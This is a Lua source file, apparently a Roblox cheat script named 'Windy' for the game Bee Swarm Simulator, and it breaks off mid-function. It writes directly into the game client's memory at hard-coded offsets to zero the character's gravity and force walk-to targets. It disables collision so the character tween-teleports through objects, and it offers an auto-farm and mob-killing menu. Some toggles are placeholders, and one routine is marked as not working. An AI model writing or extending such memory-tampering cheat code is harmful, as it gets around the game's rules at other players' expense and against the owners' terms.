
local TweenService = {}
local EasingFunctions = {
    Linear = function(t) return t end,
    Sine = {
        In = function(t) return 1 - math.cos((t * math.pi) / 2) end,
        Out = function(t) return math.sin((t * math.pi) / 2) end,
        InOut = function(t) return -(math.cos(math.pi * t) - 1) / 2 end
    },
    Quad = {
        In = function(t) return t * t end,
        Out = function(t) return 1 - (1 - t) * (1 - t) end,
        InOut = function(t) return t < 0.5 and 2 * t * t or 1 - (-2 * t + 2) ^ 2 / 2 end
    },
    Cubic = {
        In = function(t) return t * t * t end,
        Out = function(t) return 1 - (1 - t) ^ 3 end,
        InOut = function(t) return t < 0.5 and 4 * t * t * t or 1 - (-2 * t + 2) ^ 3 / 2 end
    },
    Bounce = {
        Out = function(t)
            local n1 = 7.5625
            local d1 = 2.75
            if t < 1 / d1 then
                return n1 * t * t
            elseif t < 2 / d1 then
                t = t - 1.5 / d1
                return n1 * t * t + 0.75
            elseif t < 2.5 / d1 then
                t = t - 2.25 / d1
                return n1 * t * t + 0.9375
            else
                t = t - 2.625 / d1
                return n1 * t * t + 0.984375
            end
        end
    }
}

local function getEasingFunction(easingStyle, easingDirection)
    if easingStyle == "Linear" then return EasingFunctions.Linear end
    if EasingFunctions[easingStyle] then
        if easingDirection == "In" then return EasingFunctions[easingStyle].In
        elseif easingDirection == "Out" then return EasingFunctions[easingStyle].Out
        else return EasingFunctions[easingStyle].InOut end
    end
    return EasingFunctions.Linear
end

local TweenInfo = {}
TweenInfo.__index = TweenInfo
function TweenInfo.new(time, easingStyle, easingDirection, repeatCount, reverses, delayTime)
    local self = setmetatable({}, TweenInfo)
    self.Time = time or 1
    self.EasingStyle = easingStyle or "Quad"
    self.EasingDirection = easingDirection or "Out"
    self.RepeatCount = repeatCount or 0
    self.Reverses = reverses or false
    self.DelayTime = delayTime or 0
    return self
end

local Tween = {}
Tween.__index = Tween
function Tween.new(instance, tweenInfo, properties)
    local self = setmetatable({}, Tween)
    self.Instance = instance
    self.TweenInfo = (type(tweenInfo) == "table" and getmetatable(tweenInfo) ~= TweenInfo) and TweenInfo.new(tweenInfo.Time, tweenInfo.EasingStyle, tweenInfo.EasingDirection) or tweenInfo
    self.Properties = properties
    self.InitialProperties = {}
    self.IsPlaying = false
    self.Thread = nil

    for prop, targetValue in pairs(properties) do
        local initialValue = instance[prop]
        if type(initialValue) == "userdata" and pcall(function() return initialValue.X end) then
            self.InitialProperties[prop] = {
                type = "Vector3",
                x = initialValue.X,
                y = initialValue.Y,
                z = initialValue.Z
            }
        else
            self.InitialProperties[prop] = initialValue
        end
    end
    return self
end

function Tween:Play()
    if self.IsPlaying then return end
    self.IsPlaying = true
    
    self.Thread = spawn(function()
        local startTime = os.clock()
        local duration = self.TweenInfo.Time
        local easingFunc = getEasingFunction(self.TweenInfo.EasingStyle, self.TweenInfo.EasingDirection)
        local originalGravity = nil
        local humanoid = nil
        pcall(function()
            if self.Instance.Parent then
                local character = self.Instance.Parent
                humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    originalGravity = GetGravity(humanoid)
                    if originalGravity then
                        SetGravity(humanoid, 0)
                    end
                end
            end
        end)
        local originalCanCollide = {}
        pcall(function()
            if self.Instance.Parent then
                for _, part in pairs(self.Instance.Parent:GetDescendants()) do
                    if part:IsA("BasePart") then
                        originalCanCollide[part] = part.CanCollide
                        part.CanCollide = false
                    end
                end
            end
        end)
        
        if self.TweenInfo.DelayTime > 0 then
            wait(self.TweenInfo.DelayTime)
        end
        
        local tweenStart = os.clock()
        
        while self.IsPlaying do
            local elapsed = os.clock() - tweenStart
            local progress = math.min(elapsed / duration, 1)
            local alpha = easingFunc(progress)
            for prop, targetValue in pairs(self.Properties) do
                local initialValue = self.InitialProperties[prop]
                
                if type(initialValue) == "table" and initialValue.type == "Vector3" then
                    local targetX = targetValue.X
                    local targetY = targetValue.Y
                    local targetZ = targetValue.Z
                    
                    local newX = initialValue.x + (targetX - initialValue.x) * alpha
                    local newY = initialValue.y + (targetY - initialValue.y) * alpha
                    local newZ = initialValue.z + (targetZ - initialValue.z) * alpha
                    
                    self.Instance[prop] = Vector3.new(newX, newY, newZ)
                elseif type(initialValue) == "number" then
                    self.Instance[prop] = initialValue + (targetValue - initialValue) * alpha
                end
            end
            pcall(function()
                self.Instance.Velocity = Vector3.new(0, 0, 0)
                self.Instance.RotVelocity = Vector3.new(0, 0, 0)
            end)
            -- this doesn't work future me
            pcall(function()
                if humanoid then
                    SetGravity(humanoid, 0)
                end
            end)
            
            pcall(function()
                if self.Instance.Parent then
                    for _, part in pairs(self.Instance.Parent:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
            
            if progress >= 1 then
                for prop, targetValue in pairs(self.Properties) do
                    self.Instance[prop] = targetValue
                end
                self.IsPlaying = false
                break
            end
            
            wait(0.006) -- 6 or 7 fps
        end
        
        pcall(function()
            for part, canCollide in pairs(originalCanCollide) do
                if part and part.Parent then
                    part.CanCollide = canCollide
                end
            end
        end)
        
        pcall(function()
            if humanoid and originalGravity then
                SetGravity(humanoid, originalGravity)
            end
        end)
    end)
end

function Tween:Stop()
    self.IsPlaying = false
    if self.Thread then
        self.Thread = nil
    end
end

function Tween:Cancel()
    self:Stop()
end

function TweenService:Create(instance, tweenInfo, properties)
    return Tween.new(instance, tweenInfo, properties)
end
-- ============================================================
-- WALKTO SYSTEM
-- ============================================================
local WALKTOPOINT_OFFSET_1 = 0x16C
local DIRECTION_OFFSET = 0x170
local WALKTOPOINT_OFFSET_2 = 0x17C

local WalkToService = {
    isWalking = false,
    currentTarget = nil,
    humanoid = nil,
    character = nil,
    updateThread = nil
}

local function WriteVector3(address, offset, vector3)
    if not address then return false end
    
    local success = pcall(function()
        memory_write("float", address + offset, vector3.X)
        memory_write("float", address + offset + 4, vector3.Y)
        memory_write("float", address + offset + 8, vector3.Z)
    end)
    
    return success
end

local function GetPosition(part)
    local pos = part.Position
    if type(pos) == "userdata" then
        return pos.X or pos.x, pos.Y or pos.y, pos.Z or pos.z
    elseif type(pos) == "table" then
        return pos.X or pos.x, pos.Y or pos.y, pos.Z or pos.z
    end
    return nil, nil, nil
end

function WalkToService.WalkTo(humanoid, targetPosition)
    if not humanoid or not humanoid.Address then
        warn("Invalid humanoid!")
        return false
    end
    
    local character = humanoid.Parent
    if not character then
        warn("No character!")
        return false
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then
        warn("No HumanoidRootPart!")
        return false
    end
    
    WalkToService.humanoid = humanoid
    WalkToService.character = character
    WalkToService.currentTarget = targetPosition
    WalkToService.isWalking = true
    
    local posX, posY, posZ = GetPosition(hrp)
    if not posX then
        warn("Can't get position!")
        return false
    end
    
    local dx = targetPosition.X - posX
    local dy = targetPosition.Y - posY
    local dz = targetPosition.Z - posZ
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    
    local direction = Vector3.new(dx / distance, dy / distance, dz / distance)
    
    local humAddress = humanoid.Address
    
    WriteVector3(humAddress, WALKTOPOINT_OFFSET_1, targetPosition)
    WriteVector3(humAddress, DIRECTION_OFFSET, direction)
    WriteVector3(humAddress, WALKTOPOINT_OFFSET_2, targetPosition)
    
    if WalkToService.updateThread then
        WalkToService.updateThread = nil
    end
    
    WalkToService.updateThread = spawn(function()
        local loopCount = 0
        
        while WalkToService.isWalking do
            loopCount = loopCount + 1
            
            if loopCount % 10 == 0 then
            end
            
            local hrp = WalkToService.character:FindFirstChild("HumanoidRootPart")
            if not hrp then
                WalkToService.Stop()
                break
            end
            
            local posX, posY, posZ = GetPosition(hrp)
            if not posX then
                WalkToService.Stop()
                break
            end
            
            local dx = WalkToService.currentTarget.X - posX
            local dy = WalkToService.currentTarget.Y - posY
            local dz = WalkToService.currentTarget.Z - posZ
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if loopCount % 10 == 0 then
            end
            
            if distance < 5 then
                WalkToService.Stop()
                break
            end
            
            local direction = Vector3.new(dx / distance, dy / distance, dz / distance)
            
            WriteVector3(humAddress, WALKTOPOINT_OFFSET_1, WalkToService.currentTarget)
            WriteVector3(humAddress, DIRECTION_OFFSET, direction)
            WriteVector3(humAddress, WALKTOPOINT_OFFSET_2, WalkToService.currentTarget)
            
            wait(0.1)
        end
        
    end)
    
    return true
end

function WalkToService.Stop()
    WalkToService.isWalking = false
    
    if WalkToService.humanoid and WalkToService.humanoid.Address then
        local humAddress = WalkToService.humanoid.Address
        local zero = Vector3.new(0, 0, 0)
        
        WriteVector3(humAddress, WALKTOPOINT_OFFSET_1, zero)
        WriteVector3(humAddress, DIRECTION_OFFSET, zero)
        WriteVector3(humAddress, WALKTOPOINT_OFFSET_2, zero)
    end
    
    WalkToService.currentTarget = nil
    WalkToService.updateThread = nil
end

function WalkTo(targetPosition)
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then
        warn("No character!")
        return false
    end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then
        warn("No humanoid!")
        return false
    end
    
    return WalkToService.WalkTo(humanoid, targetPosition)
end

function WalkToPart(part)
    if not part or not part.Position then
        warn("Invalid part!")
        return false
    end
    return WalkTo(part.Position)
end

function StopWalking()
    WalkToService.Stop()
end

function IsWalking()
    return WalkToService.isWalking
end

function WaitForArrival(timeout, threshold)
    timeout = timeout or 2
    threshold = threshold or 0.5
    local startTime = os.clock()
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    while IsWalking() do
        if os.clock() - startTime > timeout then

            StopWalking()
            return false
        end
        
        if WalkToService.currentTarget then
            local hrpPos = hrp.Position
            local dx = WalkToService.currentTarget.X - hrpPos.X
            local dy = WalkToService.currentTarget.Y - hrpPos.Y
            local dz = WalkToService.currentTarget.Z - hrpPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance < threshold then
                StopWalking()
                return true
            end
        end
        
        wait(0.1)
    end
    
    return true
end


local function GetFlowerZones()
    local zones = {}
    local flowerZones = game.Workspace.FlowerZones
    
    if flowerZones then
        for _, zone in pairs(flowerZones:GetChildren()) do
            if not string.find(string.lower(zone.Name), "brick") then
                table.insert(zones, zone.Name)
            end
        end
    end
    
    table.sort(zones)
    
    return zones
end


-- UI

local UI = {
    isRunning = true,
    activeTab = 1,
    dragging = nil,
    lastMousePressed = false,
    needsRedraw = true,
    drawings = {},
    buttons = {},
    statusUpdaterThread = nil,
    autoFarmThread = nil,
    autoDigThread = nil,
    coconutCrabThread = nil,
    tweenQueueThread = nil,
    huntingVicious = false,
    walkedToViciousOnce = false,
    collectingSproutTokens = false,
    
    panel = {
        x = 400,
        y = 200,
        width = 800,
        height = 495,
        sidebarWidth = 140
    },
    
    tabs = {
        {name = "Home", icon = "H"},
        {name = "Farming", icon = "F"},
        {name = "Combat", icon = "C"},
        {name = "Misc", icon = "M"},
        {name = "Settings", icon = "S"}
    },
    
    status = "Ready",
    
    dropdownOpen = false,
    selectedOption = "Select Field...",
    dropdownScroll = 0,
    combatDropdownOpen = false,
    selectedCombatTarget = "Any Mob",
    autoFarmEnabled = false,
    autoFarmRunning = false,
    tweenSpeed = 70,
    autoDigEnabled = false,
    autoDigRunning = false,
    tweenQueue = {},
    currentTween = nil,
    processingTween = false,
    autoGrindBlooms = false,
    lastCloudTime = 0,
    lastFlameTime = 0,
    trainSnail = false,
    trainSnailRunning = false,
    sprinklersPlaced = false,
    selectedSprinkler = "None (0)",
    pausedForTimedAction = false,
    originalAutoFarmField = nil,
    lastFieldChangeSource = nil,
    gatherTime = 30,
    gatherStartTime = nil,
    returningFromConversion = false,

}

local GRAVITY_OFFSET = 0x1d0
local GRAVITY_CONTAINER_OFFSET = 0x3c8
local PRIMITIVES_POINTER1 = 0x3c8
local PRIMITIVES_POINTER2 = 0x240
local READONLY_GRAVITY_OFFSET = 0x9b0

function SetGravity(humanoid, value)
    if not humanoid or not humanoid.Address then
        return false
    end
    
    local success = pcall(function()
        memory_write("float", humanoid.Address + GRAVITY_OFFSET, value)
        memory_write("float", humanoid.Address + GRAVITY_CONTAINER_OFFSET, value)
        
        local primPtr1 = memory_read("ptr", humanoid.Address + PRIMITIVES_POINTER1)
        if primPtr1 and primPtr1 ~= 0 then
            local primPtr2 = memory_read("ptr", primPtr1 + PRIMITIVES_POINTER2)
            if primPtr2 and primPtr2 ~= 0 then
                memory_write("float", primPtr2, value)
            end
        end
    end)
    
    return success
end

function GetGravity(humanoid)
    if not humanoid or not humanoid.Address then
        return nil
    end
    
    local success, value = pcall(function()
        return memory_read("float", humanoid.Address + GRAVITY_OFFSET)
    end)
    
    return success and value or nil
end

function ResetPlayer()
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid or not humanoid.Address then return false end
    

    local OFFSET = 0x18C
    local addr = humanoid.Address
    local v = Vector3.new(0, 0, 0)
    memory_write("float", addr + OFFSET + 8, v.Z)
    
    return true
end

function WaitForRespawn(timeout)
    timeout = timeout or 30
    local startTime = os.clock()
    local player = game.Players.LocalPlayer
    while os.clock() - startTime < timeout do
        local character = player.Character
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid and humanoid.Health <= 0 then

            break
        end
        
        wait(0.1)
    end

    startTime = os.clock()
    while os.clock() - startTime < timeout do
        local character = player.Character
        if character and character.Parent then
            local humanoid = character:FindFirstChild("Humanoid")
            local hrp = character:FindFirstChild("HumanoidRootPart")
            
            if humanoid and hrp and humanoid.Health > 0 then
                return true
            end
        end
    end
    

    return false
end

-- poi--------------------------------------------------

function UI:Track(obj, relX, relY, relX2, relY2)
    table.insert(self.drawings, {
        instance = obj,
        relX = relX,
        relY = relY,
        relX2 = relX2,
        relY2 = relY2,
        isLine = (relX2 ~= nil)
    })
    return obj
end

function UI:Clear()
    for _, d in pairs(self.drawings) do
        pcall(function() d.instance:Remove() end)
    end
    self.drawings = {}
    self.buttons = {}
end

function UI:CreateRect(x, y, w, h, color, transparency)
    local rect = Drawing.new("Square")
    rect.Size = Vector2.new(w, h)
    rect.Color = color
    rect.Filled = true
    rect.Visible = true
    rect.Transparency = transparency or 1
    rect.Position = Vector2.new(self.panel.x + x, self.panel.y + y)
    return self:Track(rect, x, y)
end

function UI:CreateText(text, x, y, color, size, center)
    local txt = Drawing.new("Text")
    txt.Text = text
    txt.Color = color
    txt.Size = size or 14
    txt.Outline = true
    txt.Visible = true
    txt.Center = center or false
    txt.Position = Vector2.new(self.panel.x + x, self.panel.y + y)
    return self:Track(txt, x, y)
end

function UI:CreateLine(x1, y1, x2, y2, color, thickness)
    local line = Drawing.new("Line")
    line.From = Vector2.new(self.panel.x + x1, self.panel.y + y1)
    line.To = Vector2.new(self.panel.x + x2, self.panel.y + y2)
    line.Color = color
    line.Thickness = thickness or 1
    line.Visible = true
    return self:Track(line, x1, y1, x2, y2)
end

function UI:RegisterButton(x, y, w, h, callback)
    table.insert(self.buttons, {
        x = x,
        y = y,
        width = w,
        height = h,
        callback = callback
    })
end

function UI:RenderTitleBar()
    local p = self.panel
    
    -- Title bar background with gradient effect
    self:CreateRect(0, 0, p.width, 50, Color3.fromRGB(25, 28, 35))
    self:CreateRect(0, 48, p.width, 2, Color3.fromRGB(16, 185, 129))
    
    -- Title
    self:CreateText("Windy", 20, 15, Color3.fromRGB(255, 255, 255), 18)
    self:CreateText("Bee Swarm Simulator", 20, 32, Color3.fromRGB(150, 160, 175), 11)
    
    -- Status indicator
    local statusX = p.width - 120
    self:CreateRect(statusX, 15, 8, 8, Color3.fromRGB(52, 211, 153))
    self:CreateText("Active", statusX + 15, 13, Color3.fromRGB(200, 210, 220), 12)
    
    -- Close button
    local closeX = p.width - 40
    self:CreateRect(closeX, 12, 28, 28, Color3.fromRGB(239, 68, 68))
    self:CreateText("Ã—", closeX + 8, 13, Color3.fromRGB(255, 255, 255), 20)
    self:RegisterButton(closeX, 12, 28, 28, function() UI:Shutdown() end)
end

function UI:RenderSidebar()
    local p = self.panel
    local sw = p.sidebarWidth
    self:CreateRect(0, 50, sw, p.height - 50, Color3.fromRGB(20, 23, 30))
    self:CreateRect(sw, 50, 1, p.height - 50, Color3.fromRGB(40, 45, 55))
    
    local tabHeight = 45
    local startY = 70
    
    for i, tab in ipairs(self.tabs) do
        local tabY = startY + ((i - 1) * tabHeight)
        local isActive = (i == self.activeTab)
        
        if isActive then
            self:CreateRect(0, tabY, sw, tabHeight, Color3.fromRGB(16, 185, 129))
            -- Active indicator
            self:CreateRect(0, tabY, 4, tabHeight, Color3.fromRGB(6, 150, 100))
        else
            self:CreateRect(0, tabY, sw, tabHeight, Color3.fromRGB(20, 23, 30))
        end
        
        local iconColor = isActive and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(120, 130, 145)
        self:CreateText(tab.icon, 25, tabY + 8, iconColor, 16)
        
        local textColor = isActive and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 160, 175)
        self:CreateText(tab.name, 50, tabY + 15, textColor, 13)
        
        self:RegisterButton(0, tabY, sw, tabHeight, function()
            self.activeTab = i
            self.needsRedraw = true
        end)
        
        if i < #self.tabs then
            local sepColor = isActive and Color3.fromRGB(6, 150, 100) or Color3.fromRGB(30, 35, 45)
            self:CreateRect(15, tabY + tabHeight - 1, sw - 30, 1, sepColor)
        end
    end
end

function UI:RenderMainTab()
    local contentX = self.panel.sidebarWidth + 30
    local contentY = 80
    
    self:CreateText("Dashboard", contentX, contentY, Color3.fromRGB(255, 255, 255), 20)
    
    contentY = contentY + 40
    self:CreateRect(contentX, contentY, 360, 80, Color3.fromRGB(30, 35, 45))
    self:CreateRect(contentX, contentY, 360, 3, Color3.fromRGB(16, 185, 129))
    
    self:CreateText("Current Status", contentX + 15, contentY + 15, Color3.fromRGB(180, 190, 200), 12)
    self:CreateText(self.status, contentX + 15, contentY + 35, Color3.fromRGB(16, 185, 129), 16)
    
    contentY = contentY + 100
    
    self:CreateRect(contentX, contentY, 170, 45, Color3.fromRGB(16, 185, 129))
    self:CreateText("Start Bot", contentX + 50, contentY + 15, Color3.fromRGB(255, 255, 255), 14)
    self:RegisterButton(contentX, contentY, 170, 45, function()
        self.status = "Bot Running..."
        self.needsRedraw = true
    end)
    
    self:CreateRect(contentX + 190, contentY, 170, 45, Color3.fromRGB(239, 68, 68))
    self:CreateText("Stop Bot", contentX + 240, contentY + 15, Color3.fromRGB(255, 255, 255), 14)
    self:RegisterButton(contentX + 190, contentY, 170, 45, function()
        self.status = "Stopped"
        self.needsRedraw = true
    end)
    
    contentY = contentY + 65
    self:CreateText("Quick Actions", contentX, contentY, Color3.fromRGB(180, 190, 200), 13)
    
    contentY = contentY + 25
    local btnY = contentY
    
    local actions = {
    {text = "Claim Hive", callback = function() self:WalkToHive() end},
    {text = "Find Bubbles", callback = function() self:FindBubbleLocation() end},
    {text = "Bye", callback = function()
        self.isRunning = false
        self:Clear()
    end}
}
    
    for i, action in ipairs(actions) do
        local btnX = contentX + ((i - 1) * 125)
        self:CreateRect(btnX, btnY, 110, 38, Color3.fromRGB(45, 55, 70))
        self:CreateText(action.text, btnX + 20, btnY + 12, Color3.fromRGB(200, 210, 220), 13)
        self:RegisterButton(btnX, btnY, 110, 38, action.callback)
    end
end

function UI:RenderFarmingTab()
    local contentX = self.panel.sidebarWidth + 30
    local contentY = 80
    
    self:CreateText("Farming Settings", contentX, contentY, Color3.fromRGB(255, 255, 255), 20)
    
    contentY = contentY + 40
    
    -- Toggle options
    local toggles = {
        {label = "Auto Farm", key = "autoFarmEnabled"},
        {label = "Auto Dig", key = "autoDigEnabled"},
        {label = "Use Sprinkler", key = "useSprinkler"},
        {label = "Collect Tokens", key = "collectTokens"},
    }
    
    for i, toggle in ipairs(toggles) do
        local toggleY = contentY + ((i - 1) * 28)
        
        local value = self[toggle.key] or false
        
        self:CreateRect(contentX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
        self:CreateText(toggle.label, contentX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
        
        local switchX = contentX + 170
        local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
        
        local circleX = value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
        
        self:RegisterButton(contentX, toggleY, 196, 22, function()
            if toggle.key == "autoFarmEnabled" then
                self.autoFarmEnabled = not self.autoFarmEnabled
                self.needsRedraw = true
                
                if self.autoFarmEnabled then
                    self:StartAutoFarm()
                else
                    self:StopAutoFarm()
                end
            elseif toggle.key == "autoDigEnabled" then
                self.autoDigEnabled = not self.autoDigEnabled
                self.needsRedraw = true
                
                if self.autoDigEnabled then
                    self:StartAutoDig()
                else
                    self:StopAutoDig()
                end
            elseif toggle.key == "useSprinkler" then
                self.useSprinkler = not self.useSprinkler
                self.needsRedraw = true
            elseif toggle.key == "collectTokens" then
                self.collectTokens = not self.collectTokens 
                self.needsRedraw = true
            end
        end)
    end
    
    local dropdown1X = contentX + 220
    local dropdownY = contentY
    
    self:CreateText("Field Selection", dropdown1X, contentY - 25, Color3.fromRGB(200, 210, 220), 14)
    self:CreateText("Last selected: " .. self.selectedOption, dropdown1X, dropdownY - 12, Color3.fromRGB(120, 130, 145), 10)
    
    self:CreateRect(dropdown1X, dropdownY, 150, 26, Color3.fromRGB(30, 35, 45))
    self:CreateText(self.selectedOption, dropdown1X + 8, dropdownY + 7, Color3.fromRGB(200, 210, 220), 12)
    self:CreateText("v", dropdown1X + 135, dropdownY + 6, Color3.fromRGB(150, 160, 175), 12)
    
    self:RegisterButton(dropdown1X, dropdownY, 150, 26, function()
        if not self.lastMousePressed then
            self.dropdownOpen = not self.dropdownOpen
            self.needsRedraw = true
        end
    end)
    
    local dropdown2X = dropdown1X + 170
    
    self:CreateText("Sprinkler", dropdown2X, contentY - 25, Color3.fromRGB(200, 210, 220), 14)
    
    if not self.secondDropdownOpen then
        self.secondDropdownOpen = false
    end
    if not self.selectedSecondOption then
        self.selectedSecondOption = "None (0)"
    end
    
    self:CreateText("Selected: " .. self.selectedSprinkler, dropdown2X, dropdownY - 12, Color3.fromRGB(120, 130, 145), 10)

    self:CreateRect(dropdown2X, dropdownY, 150, 26, Color3.fromRGB(30, 35, 45))
    self:CreateText(self.selectedSprinkler, dropdown2X + 8, dropdownY + 7, Color3.fromRGB(200, 210, 220), 12)
    
    self:RegisterButton(dropdown2X, dropdownY, 150, 26, function()
        if not self.lastMousePressed then
            self.secondDropdownOpen = not self.secondDropdownOpen
            self.needsRedraw = true
        end
    end)
    
    -- Field Abilities Section - RIGHT COLUMN under sprinkler
    local fieldAbilityX = dropdown2X
    local fieldAbilityY = dropdownY + 50
    
    self:CreateText("Dispensers & Misc", fieldAbilityX, fieldAbilityY, Color3.fromRGB(200, 210, 220), 14)
    
    fieldAbilityY = fieldAbilityY + 25
    
    local fieldToggles = {
        {label = "Hi", key = "Hi"},
        {label = "Hi", key = "Hi"},
        {label = "Hi", key = "Hi"},
        {label = "Hi", key = "Hi"},
        {label = "Farm Sprouts (Buggy)", key = "farmSprouts"},
        {label = "Use Field Dice", key = "useFieldDice"},
        {label = "Use Micro Converter", key = "useMicroConverter"},
        {label = "Use Coconut", key = "useCoconut"},
        {label = "Use Glitter", key = "useGlitter"},
        {label = "Use Snowflake", key = "useSnowflake"}
    }
    
    for i, toggle in ipairs(fieldToggles) do
        local toggleY = fieldAbilityY + ((i - 1) * 28)
        
        local value = self[toggle.key] or false
        
        self:CreateRect(fieldAbilityX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
        
        self:CreateText(toggle.label, fieldAbilityX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
        
        local switchX = fieldAbilityX + 170
        local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
        
        local circleX = value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
        
        self:RegisterButton(fieldAbilityX, toggleY, 196, 22, function()
            if toggle.key then
                self[toggle.key] = not self[toggle.key]
                self.needsRedraw = true
            end
        end)
    end
    
    -- Gather Settings Section
    contentY = contentY + 120
    self:CreateText("Gather Settings", contentX, contentY, Color3.fromRGB(200, 210, 220), 14)
    
    contentY = contentY + 25
    
    local gatherToggles = {
        {label = "Farm Puppy Ball", key = "farmPuppyBall"},
        {label = "Farm Blooms", key = "autoGrindBlooms"},
        {label = "Farm Under Balloons", key = "farmUnderBalloons"},
        {label = "Farm Under Clouds", key = "farmUnderClouds"},
        {label = "Farm Flames (Buggy)", key = "farmFlames"},
        {label = "Farm Bubbles", key = "farmBubbles"},
        {label = "Convert Balloon", key = "convertBalloon"},
        {label = "Reset When Full", key = "resetWhenFull"}
    }
    
for i, toggle in ipairs(gatherToggles) do
    local toggleY = contentY + ((i - 1) * 28)
    
    local value = self[toggle.key] or false
    
    self:CreateRect(contentX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
    
    self:CreateText(toggle.label, contentX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
    
    local switchX = contentX + 170
    local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
    self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
    
    local circleX = value and switchX + 12 or switchX + 1
    self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
    
    self:RegisterButton(contentX, toggleY, 196, 22, function()
        if toggle.key == "farmPuppyBall" then
            self.farmPuppyBall = not self.farmPuppyBall
            self.needsRedraw = true
            
            if self.farmPuppyBall then
                self:StartFarmPuppyBall()
            else
                self:StopFarmPuppyBall()
            end
        elseif toggle.key then
            self[toggle.key] = not self[toggle.key]
            self.needsRedraw = true
        end
    end)
end

-- RENDER DROPDOWNS LAST SO THEY APPEAR ON TOP
if self.dropdownOpen then
    local options = GetFlowerZones()
    local menuY = dropdownY + 28
    
    self:CreateRect(dropdown1X, menuY, 150, #options * 24, Color3.fromRGB(25, 28, 35))
    
    for i, option in ipairs(options) do
        local optionY = menuY + ((i - 1) * 24)
        
        self:CreateRect(dropdown1X, optionY, 150, 24, Color3.fromRGB(40, 45, 55))
        self:CreateText(option, dropdown1X + 8, optionY + 6, Color3.fromRGB(200, 210, 220), 11)
        
        self:RegisterButton(dropdown1X, optionY, 150, 24, function()
            if not self.lastMousePressed then
                self.selectedOption = option
                self.dropdownOpen = false
                self.needsRedraw = true
            end
        end)
    end
end
    
    if self.secondDropdownOpen then
        local options = {
            "Basic (1)",
            "Silver (2)",
            "Gold (3)",
            "Diamond (4)",
            "Supreme (1)",
            "None (0)"
        }
        local menuY = dropdownY + 28
        
        self:CreateRect(dropdown2X, menuY, 150, #options * 24, Color3.fromRGB(25, 28, 35))
        
        for i, option in ipairs(options) do
            local optionY = menuY + ((i - 1) * 24)
            
            self:CreateRect(dropdown2X, optionY, 150, 24, Color3.fromRGB(40, 45, 55))
            self:CreateText(option, dropdown2X + 8, optionY + 6, Color3.fromRGB(200, 210, 220), 11)
            
            self:RegisterButton(dropdown2X, optionY, 150, 24, function()
                if not self.lastMousePressed then
                    self.selectedSprinkler = option
                    self.secondDropdownOpen = false
                    self.needsRedraw = true
                end
            end)
        end
    end
end

function UI:RenderCombatTab()
    local contentX = self.panel.sidebarWidth + 30
    local contentY = 80
    
    self:CreateText("Combat & Mobs", contentX, contentY, Color3.fromRGB(255, 255, 255), 20)
    
    contentY = contentY + 40
    
    local combatToggles = {
        {label = "Kill Coconut Crab", key = "killCoconutCrab"},
        {label = "Train Snail", key = "trainSnail"},
        {label = "Kill King Beetle (a)", key = "killKingBeetle"},
        {label = "Kill Vicious Bee (a)", key = "killViciousBee"},
        {label = "Kill Commando Chick (a)", key = "killCommandoChick"},
        {label = "Kill Windy (a)(Buggy)", key = "killWindy"},
        {label = "Kill Tunnel Bear (a)", key = "killTunnelBear"},
        {label = "Hi", key = "avoidTough"}
    }

    for i, toggle in ipairs(combatToggles) do
        local toggleY = contentY + ((i - 1) * 28)
        
        local value = self[toggle.key] or false
        
        self:CreateRect(contentX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
        
        self:CreateText(toggle.label, contentX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
        
        local switchX = contentX + 170
        local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
        
        local circleX = value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
        
        self:RegisterButton(contentX, toggleY, 196, 22, function()
            if toggle.key == "killCoconutCrab" then
                if not value and self.autoFarmEnabled then

                    return
                end
                
                self.killCoconutCrab = not self.killCoconutCrab
                self.needsRedraw = true
                
                if self.killCoconutCrab then
                    self:StartCoconutCrab()
                else
                    self:StopCoconutCrab()
                end
            elseif toggle.key == "trainSnail" then
                if not value and self.autoFarmEnabled then

                    return
                end
                
                self.trainSnail = not self.trainSnail
                self.needsRedraw = true
                
                if self.trainSnail then
                    self:StartTrainSnail()
                else
                    self:StopTrainSnail()
                end
            elseif toggle.key == "killKingBeetle" then
                self.killKingBeetle = not self.killKingBeetle
                self.needsRedraw = true
                
                if self.killKingBeetle then
                    if not self.autoFarmEnabled then

                    end
                else

                end
            elseif toggle.key == "killViciousBee" then
                self.killViciousBee = not self.killViciousBee
                self.needsRedraw = true
                
